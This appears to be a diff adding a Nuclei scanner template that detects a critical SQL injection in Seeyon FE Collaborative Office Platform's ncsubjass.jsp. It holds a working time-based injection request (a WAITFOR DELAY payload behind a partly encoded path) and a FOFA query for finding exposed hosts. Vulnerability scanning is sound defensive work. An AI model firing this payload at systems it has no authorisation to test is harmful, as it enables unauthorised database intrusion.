@@ -1,0 +1,30 @@
+http:
+- matchers:
+  - dsl:
+    - duration>=5
+    type: dsl
+  raw:
+  - '@timeout: 10s
+
+    POST /fenc/ncsubjass.j%73p HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    subjcode='';WAITFOR DELAY ''0:0:5''--
+
+    '
+id: seeyon-fe-ncsubjass-sqli
+info:
+  author: Co5mos
+  description: "\u81F4\u8FDC\u4E92\u8054FE\u534F\u4F5C\u529E\u516C\u5E73\u53F0 `ncsubjass.jsp`\
+    \ \u5B58\u5728SQL\u6CE8\u5165\u6F0F\u6D1E, \u672A\u7ECF\u8EAB\u4EFD\u9A8C\u8BC1\
+    \u7684\u653B\u51FB\u8005\u53EF\u4EE5\u901A\u8FC7\u6B64\u6F0F\u6D1E\u83B7\u53D6\
+    \u6570\u636E\u5E93\u654F\u611F\u4FE1\u606F\u3002\n"
+  metadata:
+    fofa-query: body="li_plugins_download"
+  name: Seeyon FE Collaborative Office Platform ncsubjass.jsp SQL Injection
+  severity: critical
+  tags: seeyon, fe, sqli
